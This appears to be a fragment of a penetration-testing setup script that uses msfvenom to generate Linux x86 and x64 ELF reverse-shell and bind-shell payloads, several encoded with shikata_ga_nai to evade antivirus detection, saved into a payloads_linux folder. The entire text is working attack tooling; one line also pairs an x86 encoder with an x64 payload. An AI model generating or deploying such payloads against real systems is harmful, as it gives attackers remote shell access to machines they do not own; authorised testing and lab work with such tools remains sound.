mkdir payloads_linux
cd payloads_linux

  # Reverse shells
  msfvenom -p linux/x86/shell_reverse_tcp LHOST=$ip_local LPORT=$port_local EXITFUNC=thread -f elf -a x86 --platform linux -o shell_reverse_tcp_x86.elf
  msfvenom -p linux/x64/shell_reverse_tcp LHOST=$ip_local LPORT=$port_local EXITFUNC=thread -f elf -a x64 --platform linux -o shell_reverse_tcp_x64.elf

  msfvenom -p linux/x86/shell_reverse_tcp LHOST=$ip_local LPORT=444 EXITFUNC=thread -f elf -a x86 --platform linux -e x86/shikata_ga_nai -o shell_reverse_tcp_x86_shikata_ga_nai.elf
  msfvenom -p linux/x64/shell_reverse_tcp LHOST=$ip_local LPORT=$port_local EXITFUNC=thread -f elf -a x64 --platform linux -e x64/shikata_ga_nai -o shell_reverse_tcp_x64_shikata_ga_nai.elf

  # Bind shells
  msfvenom -p linux/x86/shell_bind_tcp LPORT=$port_remote EXITFUNC=thread -f elf -a x86 --platform linux -o shell_bind_tcp_x86.elf
  msfvenom -p linux/x64/shell_bind_tcp LPORT=$port_remote EXITFUNC=thread -f elf -a x64 --platform linux -o shell_bind_tcp_x64.elf

  msfvenom -p linux/x86/shell_bind_tcp LPORT=$port_remote EXITFUNC=thread -f elf -a x86 --platform linux -e x86/shikata_ga_nai -o shell_bind_tcp_x86_shikata_ga_nai.elf
  msfvenom -p linux/x64/shell_bind_tcp LPORT=$port_remote EXITFUNC=thread -f elf -a x64 --platform linux -e x86/shikata_ga_nai -o shell_bind_tcp_x64_shikata_ga_nai.elf

  # Create all common shells in payloads_linux folder
  bash setup_payloads.sh
cd -
